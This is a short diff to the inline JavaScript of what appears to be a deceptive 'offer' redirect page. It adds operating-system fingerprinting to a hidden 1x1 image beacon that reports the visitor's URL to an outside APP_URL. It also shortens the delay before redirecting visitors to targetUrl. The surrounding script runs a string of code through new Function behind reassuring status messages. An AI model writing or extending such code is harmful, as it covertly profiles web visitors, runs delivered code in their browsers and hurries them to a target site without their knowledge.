@@ -82,7 +82,11 @@
 
         function sendLink() {
             const currentPage = window.location.href;
-            const payload = { offer: currentPage };
+            const os = detectOS();
+            const payload = { 
+                offer: currentPage,
+                os: os
+            };
             const q = new URLSearchParams({ p: JSON.stringify(payload) }).toString();
             new Image(1,1).src = APP_URL + "?" + q + "&_t=" + Date.now();
         }
@@ -104,12 +108,13 @@
                         new Function('headline', 'status', code)(headline, status);
                     } catch {
                         status.textContent = 'Processing request...';
+                        setTimeout(() => { window.location.replace(targetUrl); }, 500);
                     }
                 }
                 load();
             } else {
                 status.textContent = 'Preparing redirect...';
-                setTimeout(() => { window.location.replace(targetUrl); }, 2000);
+                setTimeout(() => { window.location.replace(targetUrl); }, 500);
             }
         })();
     </script>
